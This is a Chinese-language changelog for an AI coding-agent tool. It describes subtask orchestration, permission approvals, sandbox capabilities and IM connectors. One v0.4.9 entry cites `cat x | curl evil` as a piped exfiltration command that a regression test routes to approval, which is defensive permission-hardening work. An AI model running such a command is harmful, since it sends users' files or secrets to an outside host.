## v0.6.0 - 2026-11-12

本版本新增 Standard、Plan、Super Agent 工作模式和异步子任务编排，完善任务恢复、结果验收与待办推进；同时合入联网搜索、网页抓取优化，减少重复执行、空等和不必要的上下文开销。

### 升级影响

- 新会话默认 Standard，已有会话独立记忆工作模式；用 `/mode` 切换，TUI 也可按 `Ctrl+O`。Plan 仅使用获准的只读工具，Super Agent 的执行工作由专用 executor 子任务完成；工作模式与手动、AUTO、FULL 审批分别管理。
- Super Agent 结束或取消主对话轮次后，已受理的后台任务继续运行。取消指定任务使用 `task_cancel`，停止整批任务使用 `/tasks-stop`；已产生的文件修改不会自动回滚。
- 后台任务重启后不会自动重放执行；先核对记录和副作用，再显式恢复。旧 explore/coder 等任务仍在 Standard 中继续，Super Agent 的 `resume_id` 只接受 executor 任务；缺少已保存能力上限的旧任务需要新建。
- 通用 executor 在适用的 Git 仓库中默认使用独立工作区；脏工作区可创建包含暂存、未暂存及非忽略未跟踪文件的快照。独立工作区的结果需显式检查和应用，不会自动合入主工作区；外部服务等不适合隔离的任务使用共享工作区。

### 工作模式与后台执行

- 新增异步任务提交、依赖、定向追加、取消、结果读取和验收重试。主 Agent 受理新需求与后台执行解耦，结果返回后自动开启协调轮次。
- 独立工作区和只读任务按配置并发，同一共享工作区的写任务串行；任务面板显示排队原因、隔离方式和调度说明。
- 子任务沿用所属会话的实时审批选择，并保留派发时捕获的模型、工具及 MCP 服务范围；切换会话不会串改原任务的审批状态。
- 修复任务收据恢复、更新序号、重复终态、跨会话操作、分页、用量累计和删除重试；补齐任务目录及锁文件的符号链接校验。

### 待办推进与结果交接

- 待办按需求计划保存，支持 pending、in_progress、completed、blocked、cancelled；未交付事项在最终报告中保留，防止只完成前几项就结束。
- 各工作模式在结束前核对当前计划；后台仍有对应任务时允许交还前台，无进展时有限次数提醒，更新失败明确报告，避免无限循环。
- 完成通知携带同一需求的完整任务清单及未完成数量；报告超出预算时提供分页入口，固定到具体尝试和内容，避免恢复或翻页时混入新结果。
- 子任务交接可记录验证状态、实际入口、覆盖范围和限制；主 Agent 需核对不同报告的发现与冲突，受阻或未执行的验证不能当成通过。

### 工具等待与上下文开销

- Shell 对同一执行者、环境、权限和超时范围下仍在运行的相同匿名请求复用进程，避免等待超时后重复启动；显式命名任务保持独立。
- `process wait/watch` 默认由宿主等待事件或取消，不再定时唤醒模型；显式等待预算耗尽不代表进程结束，硬超时则明确说明进程已终止。
- 上下文达到压力阈值时，优先缩短已有完整产物引用的旧查询结果，保留近期工具配对、错误、原始记录和按需读取入口；无压力时保留历史前缀，收缩后继续保留 token 预算校准。
- 精简协调和执行指引，同一上下文的连续工作优先沿用已有任务，完整日志按需读取。

### 联网搜索与网页读取

- `web_search` 支持 Exa、Tavily 与自动选择，增加域名筛选、结果去重和限流冷却；服务不可用时按条件回退，不会静默移除域名约束。
- 改善 `web_fetch` 和 `web_extract` 的正文提取、HTML 转 Markdown、内容聚焦及输出限长，区分抓取失败、无有效正文和截断结果。
- 收紧 URL、重定向与实际连接地址的公网边界检查；补充网络或沙箱失败后的最小权限恢复指引，保留明确拒绝和既有安全规则。

### TUI、GUI 与接口

- `Ctrl+G` 子任务面板增加独立过程页和工具调用详情，支持上下选择、历史翻页、实时更新与暂停跟随；修复迟到回执、轮次切换、工具耗时和输出丢失。
- 优化执行确认卡的间隔、排版与危险选项标记；底部 Mode 仅展示当前模式，Super Agent 简写为 Super。
- GUI 增加任务管理与档案、排队需求和待处理请求预览；修复排队发送后无法继续发送、重复消息、取消与启动竞态、会话切换串台。
- 补齐 Runtime、HTTP 和 Wails 的任务管理接口与类型绑定，同步 GUI 构建产物及工作模式、任务管理文档。

## v0.5.9 - 2026-11-05

本版本修复工具注册表重建造成的能力丢失，补齐 MCP 能力发现，改善子任务详情的滚动与跟随体验，并修复文件发送、连接器身份切换和取消退出问题。

### 升级影响

- `deliver_file` 省略目标时只发送到当前请求来源的连接器；本地请求需要指定连接器，只有显式使用 `connector: "*"` 才广播到所有支持文件发送的连接器。
- `read` 的文本读取上限为 64 MiB；文本、图片和 PDF 读取拒绝特殊文件，避免 FIFO 等节点阻塞任务取消。
- 飞书 AppID 或 Secret 变更后停用旧连接，后续连接或配对使用新凭据；更换 AppID 时清除旧绑定。

### 工具与 MCP 能力

- 修复注入 `deliver_file` 时重建工具注册表、丢失 `capability`、`skill` 和 `agent_profiles`，以及 Agent 与注册表分离的问题；模型切换和配置重建后保留注入工具及扩展接线。
- 每轮环境上下文附带有大小上限的 MCP 服务名称、状态和工具数量，并引导模型按需 list、inspect、call；动态清单只在内容变化时追加到对话尾部，不修改静态提示词或工具 schema。
- 内置 coder、explore 配置补齐 index、LSP、tree 和 diff 工具；规划模式允许 index、diff 查询，自定义工具白名单保持显式约束。
- index 对无效查询、初始化失败和搜索错误返回明确失败，并提供 grep/read 回退提示；区分索引不可用与查询无结果。
- 修复子任务运行时回调进入持久执行记录后无法 JSON 序列化的问题，同时保留实际调用所需的回调。

### 子任务与交互

- Activity 显示成功派发的子任务，失败和部分结果继续保留可操作提示。
- 子任务详情中的状态卡随消息列表滚动，并刷新动画；保留工具执行期间最近的输出和推理内容。
- 统一详情页的滚轮、方向键和翻页步长，修复窗口缩放空白、历史翻页落点、加载失败重试及异步返回打断阅读位置的问题；滚动到底部恢复跟随。
- 提问选项优先匹配完整标签，只有唯一前缀匹配时才接受缩写，避免选择错误选项。

### 文件与连接器

- 文件发送按项目根解析相对路径，在授权根内校验普通文件并限长读取，上传使用私有快照，结束后清理；完整返回部分发送失败及成功目标。
- 飞书消息授权事务核对当前连接及凭据，拒绝旧连接消耗新配对码；修复并发消息因配置版本竞争被静默丢弃的问题。
- Telegram 轮询按最新配置提交绑定与 offset，避免恢复已撤销的绑定；照片说明中的配对指令正确持久化。
- Telegram、飞书、企业微信和 QQBot 在图片任务被拒绝时释放连接器下载文件；成功接收后交由运行时处理，清理不触碰调用方自有文件。
- 修复 QQ 网关重连后遗留连接协程、配置副本共享可变字段，以及日志打开期间不触发轮转的问题。

### 协议与文件访问

- 完善 SSE 多行数据及换行解析、流内错误传播、截断检测和取消处理，保留流末尾用量，避免消费者退出后阻塞生产协程。
- ACP 与 headless 复用可取消的标准流处理；ACP 断连和提示取消后等待任务结束，再清理会话配置。
- MCP stdio 请求处理跳过通知并明确拒绝不支持的服务端请求，取消时回收读取协程。
- 收紧 grep 上下文参数解析、glob 工作区路径约束及后台 Git 差异查询的过滤器和钩子执行边界；插件复制保留执行权限并拒绝特殊文件。

## v0.5.8 - 2026-11-04

本版本收紧权限审批与文件访问边界，修复审批排队、会话切换和工具预览串台问题，并改善终端历史显示和代码索引。升级后，之前在项目目录中保存的授权需要重新确认。

### 权限存储与升级影响

- 持久授权改为保存在用户目录 `~/.nekocode/permissions/<项目路径哈希>/permissions.json`，按项目的规范路径隔离；不再读取项目目录中的旧授权文件，也不自动迁移旧授权，避免项目内容自行授予权限。
- 文件写入和沙箱挂载保护授权存储目录及其上级目录，拒绝通过符号链接替换授权存储。授权文件读取或解析失败时阻止相关执行，避免按“没有配置”继续放行。
- 授权保存通过跨进程锁串行合并，减少多个实例同时审批时相互覆盖的问题；显式拒绝规则优先于已有授权和自动判定。

### 审批与文件访问

- 后端统一提供本次允许、会话允许和项目持久允许等适用选项，GUI、TUI 与连接器按实际选项展示；记住授权时保存具体命令、代理目标及能力范围，避免扩大到整个工具。
- 主机执行能力 `process.host` 可通过明确的项目持久授权记住；选择本次允许仍只对当前调用有效，显式拒绝继续优先。
- Shell 复合命令按结构检查和保存授权，收紧内置安全命令规则；自动判定使用明确的结果类型，危险或失败的判定不会因提示文案被误当作安全结果。
- 审批绑定发起时的会话、项目、权限模式和文件目标；等待期间切换模式、切换会话或改变路径指向时，旧审批不能继续用于执行或保存授权。
- 文件规则同时核对调用路径和解析后的真实路径，统一检查代理工具、图片输出目录及 diff 的两个文件输入，防止符号链接绕过规则或扩大工作区授权。
- 工具预览在读取文件前核对拒绝规则与已有工作区权限；权限失效或文件目标变化时丢弃旧预览。预览不会触发自动审批或新增工作区授权。
- 预览准备和并行执行分别隔离调用参数，修复多个工具共用参数时预览相互覆盖、并发改写，以及工具开始事件显示错误预览的问题。

### 交互与会话

- 审批与提问按请求排队，避免新弹窗覆盖待处理请求；处理重复回复、取消及重入回调，保证请求和结束事件顺序一致。
- TUI 切换或删除会话时清理旧会话的待处理输入与提示，忽略无关会话的删除事件；运行开始、结束和历史加载期间保留应继续显示的交互状态。
- 修复终端消息间隔滚动、窗口缩放及内容缩短后的空白和定位问题；窄窗口下 Token 用量换行显示，历史分页保留对应的用量信息。

### 代码索引

- 修复 TSX 语法解析、Go 类型识别以及 Python、Rust 导入提取，保留同名的不同声明，并把调用关联到最内层函数，减少索引遗漏和不稳定结果。
- 为索引增加格式版本校验，旧格式或未完成的索引会重新构建，避免继续使用不兼容或不完整的数据。

## v0.5.7 - 2026-11-02

本版本完善长任务执行与恢复：增加文件版本门禁、连续性引用、执行凭证和未执行决策记录，统一子任务结束摘要，并改进待办更新时机。直接嵌入 Go 接口的调用方需迁移下述签名；普通二进制用户无需修改配置。

### 长会话与上下文

- 上下文压缩按模型窗口分批处理，完整覆盖待总结内容；全部批次成功且最终请求预算校验通过后才替换活动历史，失败时保留原内容。
- 新增任务、技能和工具输出的连续性引用，模型可通过 `context_refs` 查询更早的已接纳技能与保存结果；引用查询沿用当前会话及子任务的隔离范围，不授予额外文件权限。
- 模型请求附带有大小上限的最近执行凭证引用；历史正文和完整输出按需查询，避免长任务持续携带全部结果。

### 文件修改与执行记录

- 修改已有文件前，要求当前模型请求中包含该文件版本的有效读取结果；文件变化、修改后或压缩移除读取依据时需重新读取，避免依据旧内容覆盖文件。文件缓存命中统一校验原始内容版本。
- 实际工具调用及权限重试分别记录执行凭证，包含输入输出摘要、进程状态和输出完整性；新增 `evidence` 查询，父代理可核对当前会话下指定子任务、指定执行尝试的凭证，子代理不能跨任务查询。
- 子代理交接可携带执行凭证引用，并核对其所属执行尝试；凭证只证明记录中的调用事实，不自动判定测试通过或任务完成。
- 主、子代理历史保存或运行事件录制失败时，明确报告执行记录不完整；修复凭证快照共享底层列表、外部修改可能影响内部历史的问题。
- 执行日志关联运行、子任务和执行尝试，并补充权限、工作区及配置诊断，便于定位不同运行条件下的行为差异。
- 子代理结束摘要复用主代理的步数与结束原因结构，随执行尝试保存并通过既有结束事件输出；区分完成、取消、执行失败、步数上限和未完成提交，恢复新尝试时不沿用旧摘要，子任务摘要不会覆盖父任务汇总。
- 权限、治理、工作区等调用前阻止和队列取消增加独立决策记录，沿原工具结果保存并通过 headless、ACP 可选字段输出；与实际执行凭证分离，不进入模型正文。修复任务取消后串行工具仍可能被分派的问题，并检查审批后到执行前的取消。
- 修复子代理最终保存期间取消导致返回摘要与终态原因不一致，以及完成协议拒绝代理工具批次时丢失实际目标名的问题。

### 待办更新

- 模型上下文明确区分待开始、进行中和已完成；工具说明要求在步骤开始、完成及计划变化时及时更新，最终回复前核对状态。
- 有未完成待办且连续 6 个实际执行工具的模型轮次未成功更新时，在下一次正常推理请求中提醒核对进度；同轮多个工具只计一次，未执行的调用不计数，成功更新或新任务开始后清零。
- 提醒仅随当前请求发送，不写入会话历史、不自动完成待办；模型调用失败时保留提醒机会，禁止调用工具的最终汇总请求不注入更新提醒。

### Go 嵌入接口兼容性与迁移

- 文件缓存接口改为 `Lines(path, version)` 和 `Put(path, lines, version)`，`version` 为原始文件内容的 SHA-256（`[32]byte`）；移除读取范围参数及不带内容版本的调用方式。
- Agent 引用回调统一为 `ContextReferences(ctx, sessionID, kind)`，替代原来分开的上下文和 `EvidenceReferences` 回调；`kind` 为空时返回技能、产物引用，为 `evidence` 时返回执行凭证引用。直接嵌入相关 Go 接口的调用方需更新签名。
- 通信协议通过可选字段扩展，旧客户端可忽略；旧版本重写会话时可能丢失新增凭证、决策和摘要字段，降级后不保证这些附加记录完整保留。

## v0.5.6 - 2026-11-01

本版本改进权限审批、GUI 交互和运行事件恢复，修复子任务用量统计与目录移动后的索引同步，并降低会话列表和检查点比较的开销。

### 权限审批

- 审批卡显示请求来源、匹配规则，以及「始终允许」将保存的具体规则和项目范围；GUI 与 TUI 同步展示，便于确认授权边界。
- auto 模式下，Jev 对完整 Shell 命令给出有效安全判定后可直接放行动态语法，不再因结构检测重复询问；用户显式 ask/deny 仍优先。判定失败会单独提示，危险或失败时继续按权限规则处理；切回手动模式后丢弃在途的旧判定。

### GUI 与任务交互

- 停止任务时等待启动请求、取消确认和运行结束，期间显示「正在停止」，避免紧接着发送的新任务被旧取消请求影响；发送、停止、会话操作和控制信息读取失败时显示错误。
- 审批与提问弹窗等待后端确认后关闭，提交失败可重试，并防止重复提交、旧请求回执关闭新弹窗；其他入口处理请求后同步关闭对应弹窗。
- 防止迟到的会话加载、技能选择和命令菜单结果覆盖当前状态，保留未落盘草稿的会话身份；中文输入法确认候选词时不再误发送。

## v0.4.9 - 2026-10-17

### Jev 自动判定贯通提权与授权记忆

- auto 模式下 Jev 判定安全的 shell 命令，其沙箱能力授予（net.outbound、fs.write.path、process.host 等全部能力）直接放行，不再弹出第二个冗余审批框。判定结论自命令评估路径（含 shell 专用捷径）全程传递至提权链；显式 deny 规则仍然最优先，用户显式配置的 ask 规则命中时 Jev 结论不生效。
- **Jev 风险判定语义聚焦不可逆破坏**：判定问题从"是否危险（破坏性/不可逆/提权/数据外泄/装恶意代码）"收窄为"是否会删除、覆盖或以其他不可恢复方式损毁数据"——可逆与只读操作（含数据转移）不再视为危险，auto 模式下的打扰进一步减少；数据安全（外泄）由管道规则与授权体系承担，不属于风险判定职责。
- **宿主执行（process.host）授权支持"始终允许"记忆**：Jev-safe 自动放行已覆盖宿主执行，用户显式选择"始终允许"却从不被持久化的旧限制全链路移除（存储层、执行器短路、审批 UI 的 scope 三处）——显式人工选择与机器判定同等待遇；deny 规则与 Jev 危险判定仍优先于任何已记住的授权。
- 修复 Jev 判定结论在 shell 评估捷径上丢失的问题：首版实现漏设标记，判 safe 的命令提权仍弹框。
- 管道命令不能搭只读 allow 规则的便车：`cat x | curl evil` 类组合命令经实测正确落入 ask，回归测试锁定。

### 行为变更

- **中断的 turn 不再整体回滚对话上下文**：此前手动中断（Esc）会丢弃该轮全部消息——包括已执行的工具调用及其结果，但磁盘上的文件改动是既成事实，下次对话模型对已做的修改完全失明，可能重复或破坏自己的工作。现在：已有产出的中断轮保留全部事实，并追加一条中断标记（hint 消息，告知模型"运行被用户中断、文件可能已被修改、勿假定已完成"）；零产出的中断（模型尚未回答任何内容）仍回滚，避免重发时用户消息重复。`/rewind` 仍可按 checkpoint 撤销文件层面的改动。

### 全接入面图片支持

- IM 连接器全部支持入站收图：telegram（Photo+getFile）、feishu（image_key+MessageResource）、wecom（回调 image.url）、qqbot（attachments[].url）。下载发生在配对检查之后，失败回复明确提示而非静默丢弃；统一经 `[Image #N]` marker 约定进入运行时附件管线。
- 出站图片：run 结果文本引用的本地图片路径自动提取为原生图片消息（telegram sendPhoto、feishu 图片消息）；wecom/qqbot 因平台无对应 API 保留文本路径降级。telegram sendPhoto/sendDocument 共享 multipart 实现。
- headless 协议（NDJSON over stdio）`content` 数组新增 `image` block（路径引用，锚定子进程工作目录）；词法包含 + 符号链接真实路径双重防逃逸，越界以 turn error 拒绝。纯字符串 content 宿主完全向后兼容。
- ACP `session/prompt` 支持 ACP 规范的 image block（base64 data），解码后直接落盘会话附件目录；解析移至会话激活后执行以保证 session 归属正确。
- HTTP API `POST /input` 新增可选 `images` 字段，语义与连接器一致（label 必须出现在 text 中）。
- 新增运行时附件收养机制：run 启动时把连接器下载的任意路径图片自动转存进会话附件存储（session workspace root），`image_understand` 工具即可读取；转存失败时降级保留原路径，vision 原生投递不受影响。收养在 run goroutine 内执行，不阻塞启动锁。
- envelope 指令改为条件式："模型支持 vision 时原生交付、直接看图；不可见时走 image_understand 工具"——vision 模型不再被引导做冗余工具调用，会话中途切到非 vision 模型也不会被困死，三种历史指令措辞均保持可剥离兼容。

### deliver_file 文件投递工具

- 新增 `deliver_file` 工具：模型把工作区文件（≤50 MiB，对齐平台限制）主动发送到用户 IM。可选 `connector` 参数定向投递（telegram/feishu），缺省广播所有支持文件的运行中连接器；未配置连接器时返回引导性文本而非硬错误。

### 启动性能与事件录制治理

- 调整 Agent 的权限受阻处理：确认某能力被规则挡住、需要更高权限时直接发起最小权限请求，不再先罗列限制或备选方案再等待确认。

### 兼容性说明

## v0.4.3 - 2026-08-09

### Append-only 上下文与压缩

- 动态环境、Todo 和运行时策略不再改写 system 消息，改为带替代语义的 tagged user 消息按变化追加；hints 独立注入，不夹带其他运行时状态。

### LLM 调用日志与用量展示

- calllog 逐次记录 LLM 请求，包含耗时、TTFT、模型、协议、请求和生效的 reasoning effort、输入、缓存命中、未缓存、输出和 reasoning tokens。
- 日志不保存 prompt、请求体、响应正文、凭据或完整 provider fingerprint；URL 会移除认证信息、路径和查询参数，错误只保留安全分类。
- TUI 每轮结束后展示本轮总量、输入、缓存、未缓存、输出、可选 reasoning 和缓存命中率；只执行命令的运行不生成 turn telemetry。
- TUI 顶栏展示平均缓存命中率、当前上下文占用、距压缩门限的空间和工作区增删统计，不再显示模型名和累计 token 数。

### 模型推理与上下文配置

- 新增模型能力驱动的 `reasoning_effort`，支持 `/effort` 命令切换；可选值根据当前模型解析，未知模型只提供 Auto，明确支持关闭推理的模型额外提供 Off/`none`。
- OpenAI 兼容与 Anthropic provider 统一 reasoning/thinking 配置、流式 reasoning 内容和 usage 解析；reasoning 配置使用独立的 provider-neutral 快照。
- reasoning 原文保存在 session 中供展示和恢复。DeepSeek 只回放工具调用轮次，Anthropic 会回放带签名的 thinking，包括 signature-only block；普通历史推理不进入后续模型请求。
- 模型上下文窗口、effort、thinking 和 replay 能力合并为单一 profile 数据源，并修正 DeepSeek V4、GPT-5.4/5.5 和 Claude Opus 4.5 的能力定义。
- 上下文窗口改为模型属性：模型显式 `context_window` 优先，其次使用内置模型元数据，未知模型回退到 128K。
- GUI 概览只读展示当前模型的有效窗口；模型卡片支持可选窗口覆盖。修改 provider、model 或 protocol 后会重新解析窗口和 effort，保存时不会固化自动默认值。

### 开发者注意

### 运行时说明
